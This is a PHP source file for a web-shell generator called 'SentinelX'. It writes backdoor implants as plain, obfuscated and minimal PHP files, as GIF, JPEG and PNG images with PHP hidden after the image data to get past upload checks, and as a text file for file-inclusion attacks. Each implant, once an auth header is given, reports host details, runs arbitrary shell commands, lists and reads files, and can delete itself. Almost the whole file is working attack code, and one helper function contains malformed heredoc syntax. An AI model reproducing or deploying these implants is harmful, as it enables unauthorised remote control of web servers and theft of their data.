<?php
/**
 * SentinelX Payload Generator
 * Generates implant variants: php, encoded, jpg, png, gif, txt, minimal
 * 
 * CLI: php generator.php [type] [auth_key] [output_dir]
 *   types: all, php, encoded, jpg, png, gif, txt, minimal
 * 
 * Web: run from browser, returns download
 */

// ================ CONFIG ================
$auth_key = $argv[2] ?? $_GET['key'] ?? 'sentinelx_2024';
$output_dir = $argv[3] ?? ($_GET['dir'] ?? __DIR__ . '/../payloads');
$type = $argv[1] ?? $_GET['type'] ?? 'all';

// ================ CORE IMPLANT PHP ================

function generate_standard($key) {
    $code = str_replace("'sentinelx_2024'", var_export($key, true), get_implant_code());
    return $code;
}

function generate_minimal($key) {
    return <<<PHP
<?php
@ini_set('display_errors',0);@set_time_limit(0);
header('Content-Type: application/json');
\$k='$key';
if(!isset(\$_SERVER['HTTP_X_AUTH'])||\$_SERVER['HTTP_X_AUTH']!==\$k){echo json_encode(['status'=>'error','message'=>'auth']);exit;}
\$a=\$_POST['action']??'beacon';
if(\$a==='beacon'){echo json_encode(['status'=>'ok','data'=>['hostname'=>gethostname(),'os'=>php_uname('s').' '.php_uname('r'),'php'=>phpversion(),'user'=>function_exists('get_current_user')?get_current_user():'?','cwd'=>getcwd()]]);exit;}
if(\$a==='exec'){\$c=\$_POST['cmd']??'';\$o='';
if(function_exists('exec')){exec(\$c,\$l);\$o=implode("\n",\$l);}elseif(function_exists('shell_exec'))\$o=shell_exec(\$c)??'';
echo json_encode(['status'=>'ok','output'=>\$o,'cwd'=>getcwd()]);exit;}
if(\$a==='file'){\$p=\$_POST['path']??getcwd();\$f=\$_POST['faction']??'list';
if(\$f==='list'){\$i=array_diff(scandir(\$p),['.','..']);\$l=[];
foreach(\$i as\$e){\$fp="\$p/\$e";\$l[]=['name'=>\$e,'type'=>is_dir(\$fp)?'dir':'file','size'=>is_file(\$fp)?filesize(\$fp):0];}
echo json_encode(['status'=>'ok','items'=>\$l,'path'=>realpath(\$p)]);exit;}
if(\$f==='read'){echo json_encode(['status'=>'ok','content'=>is_file(\$p)?file_get_contents(\$p):'']);exit;}}
if(\$a==='self_destruct'){@unlink(__FILE__);echo json_encode(['status'=>'ok']);exit;}
PHP;
}

function generate_obfuscated($key) {
    $k_enc = base64_encode($key);
    return <<<PHP
<?php
@ini_set('display_errors',0);@set_time_limit(0);@ob_start('ob_gzhandler');
\$g='base64_decode';\$j='json_encode';\$h='file_get_contents';
\$k=\$g("$k_enc");\$a=\$_POST['action']??\$_GET['action']??'beacon';
header('Content-Type: application/json');
if(!isset(\$_SERVER['HTTP_X_AUTH'])||\$_SERVER['HTTP_X_AUTH']!==\$k){http_response_code(403);exit;}
if(\$a==='beacon'){echo \$j(['status'=>'ok','data'=>['hostname'=>gethostname(),'os'=>php_uname(),'php'=>phpversion(),'user'=>function_exists('get_current_user')?get_current_user():'N/A','cwd'=>getcwd()]]);exit;}
if(\$a==='exec'){\$c=\$_POST['cmd']??'';\$o='';
foreach(['exec','shell_exec','system','passthru'] as\$f){if(function_exists(\$f)){\$o=\$f(\$c);break;}}
if(!\$o&&function_exists('popen')){\$h=popen(\$c,'r');while(!feof(\$h))\$o.=fread(\$h,4096);pclose(\$h);}
echo \$j(['status'=>'ok','output'=>\$o,'cwd'=>getcwd()]);exit;}
if(\$a==='file'){\$p=\$_POST['path']??getcwd();\$f=\$_POST['faction']??'list';
if(\$f==='list'){\$i=array_diff(scandir(\$p),['.','..']);\$l=[];
foreach(\$i as\$e){\$fp="\$p/\$e";\$l[]=['name'=>\$e,'type'=>is_dir(\$fp)?'dir':'file','size'=>is_file(\$fp)?filesize(\$fp):0];}
echo \$j(['status'=>'ok','items'=>\$l,'path'=>realpath(\$p)]);exit;}
if(\$f==='read'){echo \$j(['status'=>'ok','content'=>is_file(\$p)?\$h(\$p):'']);exit;}}
if(\$a==='self_destruct'){@unlink(__FILE__);echo \$j(['status'=>'ok']);exit;}
PHP;
}

// ================ IMAGE POLYGLOT GENERATORS ================

function generate_gif_polyglot($key) {
    // Minimal 1x1 GIF89a + PHP payload after trailer
    // GIF89a header (6), LSD (7), image block, trailer (;), then PHP
    $gif = "GIF89a";
    // Logical Screen Descriptor: width=1, height=1, no GCT
    $gif .= pack('vv', 1, 1);    // 16-bit LE width, height
    $gif .= "\x00";               // packed: no GCT
    $gif .= "\x00";               // bg color index
    $gif .= "\x00";               // pixel aspect ratio
    // Image Descriptor
    $gif .= "\x2C";               // image separator
    $gif .= pack('vvvv', 0, 0, 1, 1); // left, top, width, height
    $gif .= "\x00";               // no local color table
    // Image Data (LZW minimum code size 2)
    $gif .= "\x02";               // LZW minimum code size
    $gif .= "\x02";               // block size
    $gif .= "\x4C\x01";          // LZW encoded data for 1x1
    $gif .= "\x00";               // block terminator
    // Trailer
    $gif .= "\x3B";               // GIF trailer
    // PHP payload
    $gif .= "<?php\n";
    $gif .= '$k="' . $key . '";' . "\n";
    $gif .= get_implant_short($key);
    $gif .= "\n?>";
    return $gif;
}

function generate_jpeg_polyglot($key) {
    // Minimal JPEG + PHP payload after EOI marker
    $jpeg = "\xFF\xD8";           // SOI
    // APP0 JFIF segment
    $jpeg .= "\xFF\xE0";          // APP0 marker
    $jpeg .= "\x00\x10";          // length 16
    $jpeg .= "JFIF\x00";          // identifier
    $jpeg .= "\x01\x01";          // version 1.1
    $jpeg .= "\x00";               // units
    $jpeg .= "\x00\x01";          // X density
    $jpeg .= "\x00\x01";          // Y density
    $jpeg .= "\x00\x00";          // thumbnail dimensions
    // SOF0 (Start of Frame) - needed for valid JPEG
    $jpeg .= "\xFF\xC0";          // SOF0 marker
    $jpeg .= "\x00\x0B";          // length 11
    $jpeg .= "\x08";               // precision 8
    $jpeg .= "\x00\x01";          // height 1
    $jpeg .= "\x00\x01";          // width 1
    $jpeg .= "\x01";               // number of components 1
    $jpeg .= "\x01\x11\x00";      // component 1: Y, sampling 1x1, quant table 0
    // DHT (Define Huffman Tables) - minimal
    $jpeg .= "\xFF\xC4";          // DHT marker
    $jpeg .= "\x00\x1F";          // length 31
    $jpeg .= "\x00";               // table ID 0 (DC)
    $jpeg .= "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; // counts (16 bytes)
    $jpeg .= "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; // values (12 bytes)
    $jpeg .= "\x00";               // table ID 0 (AC)  
    $jpeg .= "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    $jpeg .= "\x00";
    // SOS (Start of Scan)
    $jpeg .= "\xFF\xDA";          // SOS marker
    $jpeg .= "\x00\x08";          // length 8
    $jpeg .= "\x01";               // number of components 1
    $jpeg .= "\x01\x00";          // component 1: Y, DC/AC table 0
    $jpeg .= "\x00";               // SS
    $jpeg .= "\x3F";               // SE
    $jpeg .= "\x00";               // Ah/Al
    // Entropy-coded data (1 byte = minimal scan data)
    $jpeg .= "\x7F";
    // EOI
    $jpeg .= "\xFF\xD9";
    // PHP payload after JPEG end
    $jpeg .= "<?php\n";
    $jpeg .= '$k="' . $key . '";' . "\n";
    $jpeg .= get_implant_short($key);
    $jpeg .= "\n?>";
    return $jpeg;
}

function generate_png_polyglot($key) {
    // Minimal 1x1 white PNG + PHP payload after IEND
    // PNG signature
    $png = "\x89PNG\r\n\x1a\n";
    // IHDR chunk: 1x1, 8-bit grayscale
    $ihdr_data = pack('NNCCCCC', 1, 1, 8, 0, 0, 0, 0);
    $png .= pack('N', 13);        // length
    $png .= 'IHDR';
    $png .= $ihdr_data;
    $png .= pack('N', crc32('IHDR' . $ihdr_data));
    // IDAT chunk: minimal compressed 1x1 white pixel
    // zlib: deflate block (last=1, type=00 stored), 1 byte data: 0xFF for white (grayscale)
    // Actually for filter byte 0 + pixel 255:
    $raw = "\x00\xFF";            // filter byte 0, pixel 255
    $deflated = gzcompress($raw, 0);
    // Remove zlib header (2 bytes) and adler32 (4 bytes) for raw deflate? No, use zlib format
    $png .= pack('N', strlen($deflated));
    $png .= 'IDAT';
    $png .= $deflated;
    $png .= pack('N', crc32('IDAT' . $deflated));
    // IEND chunk
    $png .= "\x00\x00\x00\x00";
    $png .= 'IEND';
    $png .= pack('N', crc32('IEND'));
    // PHP payload after IEND
    $png .= "<?php\n";
    $png .= '$k="' . $key . '";' . "\n";
    $png .= get_implant_short($key);
    $png .= "\n?>";
    return $png;
}

function generate_txt_lfi($key) {
    return <<<PHP
<?php
@ini_set('display_errors',0);@set_time_limit(0);
header('Content-Type: application/json');
\$k='$key';
if(!isset(\$_SERVER['HTTP_X_AUTH'])||\$_SERVER['HTTP_X_AUTH']!==\$k){echo json_encode(['status'=>'error','message'=>'auth']);exit;}
\$a=\$_POST['action']??'beacon';
if(\$a==='beacon'){
    echo json_encode(['status'=>'ok','data'=>['hostname'=>gethostname(),'os'=>php_uname(),'php'=>phpversion(),'user'=>function_exists('get_current_user')?get_current_user():'N/A','cwd'=>getcwd()]]);
    exit;
}
if(\$a==='exec'){
    \$c=\$_POST['cmd']??'';\$o='';
    if(function_exists('exec')){exec(\$c,\$l);\$o=implode("\n",\$l);}
    elseif(function_exists('shell_exec'))\$o=shell_exec(\$c)??'';
    elseif(function_exists('system')){ob_start();system(\$c);\$o=ob_get_clean();}
    echo json_encode(['status'=>'ok','output'=>\$o,'cwd'=>getcwd()]);
    exit;
}
PHP;
}

// ================ SHORT PAYLOAD USED IN POLYGLOTS ================

function get_implant_short($key) {
    return <<<'PHP'
$k='PHP;
    $code = '$k=' . var_export($key, true) . ';' . "\n";
    $code .= <<<'PHP'
$a=$_POST['action']??$_GET['action']??'beacon';
if(isset($_SERVER['HTTP_X_AUTH'])&&$_SERVER['HTTP_X_AUTH']!==$k){http_response_code(403);exit;}
if($a==='beacon'){echo json_encode(['status'=>'ok','data'=>['hostname'=>gethostname(),'os'=>php_uname('s').' '.php_uname('r'),'php'=>phpversion(),'user'=>function_exists('get_current_user')?get_current_user():'N/A','cwd'=>getcwd()]]);exit;}
if($a==='exec'){$c=$_POST['cmd']??'';$o='';
if(function_exists('exec')){exec($c,$l);$o=implode("\n",$l);}elseif(function_exists('shell_exec'))$o=shell_exec($c)??'';elseif(function_exists('system')){ob_start();system($c);$o=ob_get_clean();}
echo json_encode(['status'=>'ok','output'=>$o,'cwd'=>getcwd()]);exit;}
if($a==='self_destruct'){@unlink(__FILE__);echo json_encode(['status'=>'ok']);exit;}
PHP;
    return $code;
}

// ================ CORE IMPLANT TEMPLATE ================

function get_implant_code() {
    return file_exists(__DIR__ . '/../implant.php') ? file_get_contents(__DIR__ . '/../implant.php') : '';
}

// ================ MAIN ================

function generate($type, $key, $output_dir) {
    if (!is_dir($output_dir)) mkdir($output_dir, 0755, true);
    
    $files = [];
    
    switch ($type) {
        case 'php':
        case 'standard':
            $files['implant.php'] = generate_standard($key);
            break;
        case 'minimal':
            $files['implant_minimal.php'] = generate_minimal($key);
            break;
        case 'encoded':
        case 'obfuscated':
            $files['implant_obfuscated.php'] = generate_obfuscated($key);
            break;
        case 'gif':
            $files['implant.gif'] = generate_gif_polyglot($key);
            break;
        case 'jpg':
        case 'jpeg':
            $files['implant.jpg'] = generate_jpeg_polyglot($key);
            break;
        case 'png':
            $files['implant.png'] = generate_png_polyglot($key);
            break;
        case 'txt':
        case 'lfi':
            $files['implant.txt'] = generate_txt_lfi($key);
            break;
        case 'all':
            $files['implant.php'] = generate_standard($key);
            $files['implant_minimal.php'] = generate_minimal($key);
            $files['implant_obfuscated.php'] = generate_obfuscated($key);
            $files['implant.gif'] = generate_gif_polyglot($key);
            $files['implant.jpg'] = generate_jpeg_polyglot($key);
            $files['implant.png'] = generate_png_polyglot($key);
            $files['implant.txt'] = generate_txt_lfi($key);
            break;
        default:
            die("Unknown type: $type\nAvailable: all, php, minimal, encoded, jpg, png, gif, txt\n");
    }
    
    foreach ($files as $name => $content) {
        $path = rtrim($output_dir, '/') . '/' . $name;
        file_put_contents($path, $content);
        echo "  [OK] $path (" . strlen($content) . " bytes)\n";
    }
    
    return $files;
}

// ================ RUN ================

if (php_sapi_name() === 'cli') {
    echo "SentinelX Payload Generator\n";
    echo "======================\n";
    echo "Key: $auth_key\n";
    echo "Type: $type\n";
    echo "Output: $output_dir\n\n";
    generate($type, $auth_key, $output_dir);
    echo "\nDone.\n";
} elseif (isset($_GET['type']) || isset($_GET['key'])) {
    header('Content-Type: text/plain');
    if (!in_array($type, ['all','php','minimal','encoded','jpg','png','gif','txt'])) {
        die("Available types: all, php, minimal, encoded, jpg, png, gif, txt");
    }
    generate($type, $auth_key, $output_dir);
    echo "Done.\n";
}
